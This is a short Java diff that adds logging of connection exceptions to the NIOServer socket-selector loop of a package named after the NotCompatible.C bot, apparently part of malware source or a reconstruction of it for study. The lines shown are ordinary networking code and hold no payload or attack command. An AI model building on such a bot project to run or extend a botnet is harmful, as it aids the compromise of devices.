@@ -1,16 +1,20 @@
 package diff.notcompatible.c.bot.net;
 
 import java.io.IOException;
+import java.net.ConnectException;
 import java.nio.channels.SelectionKey;
 import java.nio.channels.Selector;
 import java.nio.channels.SocketChannel;
 import java.util.Iterator;
+import java.util.logging.Logger;
 
 import diff.notcompatible.c.bot.net.tcp.Link;
 import diff.notcompatible.c.bot.objects.List;
 
 
 public class NIOServer {
+
+	private final static Logger LOGGER = Logger.getLogger("session");
 
 	private List connectionList;
 	public long lastCheck;
@@ -65,6 +69,8 @@ public class NIOServer {
                             ((CustomSocket) key.attachment()).onAccept(key);
                         }
                     }
+                } catch (ConnectException exception) {
+                	LOGGER.warning(" [*] Connection exception : [ " + exception.getMessage() + " ] ");
                 } catch (Exception exception) {
                 	exception.printStackTrace();
                     ((CustomSocket) key.attachment()).onClose(key);
